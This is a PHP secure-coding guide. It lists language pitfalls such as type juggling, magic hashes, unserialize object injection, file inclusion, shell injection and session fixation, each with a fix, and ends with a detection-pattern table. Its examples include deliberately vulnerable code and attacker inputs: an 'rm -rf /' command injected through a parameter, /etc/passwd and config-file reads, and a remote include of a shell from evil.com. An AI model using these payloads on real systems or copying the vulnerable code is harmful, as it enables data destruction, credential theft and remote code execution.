# PHP Sharp Edges

## Type Juggling

```php
// DANGEROUS: Loose comparison (==) does type coercion
"0e123" == "0e456"   // TRUE - both parsed as 0 (scientific notation)
"0" == false         // TRUE
"" == false          // TRUE
"" == 0              // TRUE (in PHP < 8)
[] == false          // TRUE
null == false        // TRUE

// Magic hash vulnerability
md5("240610708") = "0e462097431906509019562988736854"
md5("QNKCDZO")   = "0e830400451993494058024219903391"
md5("240610708") == md5("QNKCDZO")  // TRUE!

// Both start with "0e" followed by digits = parsed as 0.0
```

**Fix**: Use strict comparison `===`:
```php
"0e123" === "0e456"  // FALSE
$hash1 === $hash2    // Compares actual strings
```

## strcmp Returns NULL on Error

```php
// DANGEROUS: strcmp type confusion
if (strcmp($_POST['password'], $stored_password) == 0) {
    authenticate();
}

// Attacker sends: password[]=anything (array instead of string)
strcmp(array(), "password")  // Returns NULL, not -1 or 1

// NULL == 0 is TRUE in PHP!
// Authentication bypassed!
```

**Fix**: Validate input type and use `===`:
```php
if (is_string($_POST['password']) &&
    strcmp($_POST['password'], $stored_password) === 0) {
    authenticate();
}
```

## Variable Variables and Extract

```php
// DANGEROUS: Variable variables
$name = $_GET['name'];  // "isAdmin"
$$name = $_GET['value']; // "true"
// Creates $isAdmin = "true"

// DANGEROUS: extract() creates variables from array
extract($_POST);  // Every POST param becomes a variable!
// Attacker sends POST: isAdmin=true → $isAdmin = true

// Can overwrite existing variables:
$isAdmin = false;
extract($_POST);  // Attacker overwrites $isAdmin
```

**Fix**: Never use `extract()` with user input. Use explicit assignment.

## Unserialize RCE

```php
// DANGEROUS: Like pickle, instantiates arbitrary objects
$obj = unserialize($_GET['data']);

// Attacker crafts serialized data that:
// 1. Instantiates class with dangerous __wakeup() or __destruct()
// 2. Chains through multiple classes ("POP gadgets")
// 3. Achieves code execution

// Common gadget chains in:
// - Laravel, Symfony, WordPress, Magento
// - phpggc tool generates payloads automatically
```

**Fix**: Never unserialize untrusted data. Use JSON instead.
If you must, use `allowed_classes` parameter (PHP 7.0+):
```php
unserialize($data, ['allowed_classes' => false]);
unserialize($data, ['allowed_classes' => ['SafeClass']]);
```

## preg_replace with /e Modifier

```php
// DANGEROUS: /e modifier executes replacement as PHP code
// Removed in PHP 7.0, but legacy code still exists
preg_replace('/.*/e', $_GET['code'], '');
// Executes arbitrary PHP code!

// Even without /e, user-controlled patterns are dangerous:
preg_replace($_GET['pattern'], $replacement, $subject);
// Attacker can add /e modifier in pattern
```

**Fix**: Use `preg_replace_callback()` instead of /e.

## include/require with User Input

```php
// DANGEROUS: Local File Inclusion
include($_GET['page'] . '.php');

// Attacker: ?page=../../../etc/passwd%00
// (null byte truncates .php in old PHP)

// Attacker: ?page=php://filter/convert.base64-encode/resource=config
// Reads and encodes config.php

// DANGEROUS: Remote File Inclusion (if allow_url_include=On)
include($_GET['url']);
// Attacker: ?url=http://evil.com/shell.php
```

**Fix**: Whitelist allowed files, never use user input in include.

## == vs === with Objects

```php
// DANGEROUS: == compares values, === compares identity
$a = new stdClass();
$a->value = 1;

$b = new stdClass();
$b->value = 1;

$a == $b;   // TRUE - same property values
$a === $b;  // FALSE - different objects

// This can bypass checks:
if ($user == $admin) {  // Compares properties, not identity!
    grantAccess();
}
```

## Floating Point in Equality

```php
// DANGEROUS: Float comparison
0.1 + 0.2 == 0.3  // FALSE!
// Actually: 0.30000000000000004

// DANGEROUS: Float to int conversion
(int)"1e2"   // 1 (not 100!)
(int)1e2     // 100

// In array keys:
$arr[(int)"1e2"] = "a";  // $arr[1]
$arr[(int)1e2] = "b";    // $arr[100]
```

## Shell Command Injection

```php
// DANGEROUS: Unescaped shell commands
system("ls " . $_GET['dir']);
exec("grep " . $_GET['pattern'] . " file.txt");
passthru("convert " . $_FILES['image']['name']);

// Attacker: ?dir=; rm -rf /
```

**Fix**: Use `escapeshellarg()` and `escapeshellcmd()`:
```php
system("ls " . escapeshellarg($_GET['dir']));
```

Better: Avoid shell commands entirely, use PHP functions.

## Array Key Coercion

```php
// DANGEROUS: Array keys are coerced
$arr = [];
$arr["0"] = "a";
$arr[0] = "b";
$arr["00"] = "c";

// Result: $arr = [0 => "b", "00" => "c"]
// String "0" was coerced to integer 0!

$arr[true] = "x";   // $arr[1] = "x"
$arr[false] = "y";  // $arr[0] = "y"
$arr[null] = "z";   // $arr[""] = "z"
```

## Null Coalescing Pitfalls

```php
// ?? only checks for null/undefined, NOT falsy
$value = $_GET['x'] ?? 'default';

// If $_GET['x'] is "", 0, "0", false, []
// These are NOT null, so no default is used!

// vs ternary which checks truthiness:
$value = $_GET['x'] ?: 'default';  // Uses default for falsy values

// But ?: triggers notice for undefined variables
```

## Session Fixation

```php
// DANGEROUS: Accepting session ID from user
session_id($_GET['session']);
session_start();

// Attacker:
// 1. Gets victim to visit: site.com?session=attacker_knows_this
// 2. Victim logs in
// 3. Attacker uses same session ID to hijack session
```

**Fix**: Regenerate session ID after authentication:
```php
session_start();
// ... authenticate user ...
session_regenerate_id(true);  // true deletes old session
```

## Detection Patterns

| Pattern | Risk |
|---------|------|
| `== ` comparison with user input | Type juggling |
| `strcmp($user_input, ...)` | NULL comparison bypass |
| `$$var` or `extract($_` | Variable injection |
| `unserialize($user_input)` | Object injection RCE |
| `preg_replace('/e'` | Code execution |
| `include($user_input)` | File inclusion |
| `system/exec/passthru($user_input)` | Command injection |
| `"0e\d+" == "0e\d+"` | Magic hash comparison |
| `session_id($_GET` | Session fixation |
| Missing `===` for security checks | Type confusion bypass |
